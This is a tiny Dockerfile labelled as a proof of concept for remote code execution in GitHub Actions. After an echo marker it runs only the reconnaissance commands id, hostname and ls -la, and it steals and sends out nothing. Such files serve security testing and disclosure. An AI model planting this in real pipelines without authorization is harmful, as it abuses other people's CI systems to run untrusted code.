FROM alpine
RUN echo "--- GITHUB ACTIONS RCE POC ---"
RUN id
RUN hostname
RUN ls -la
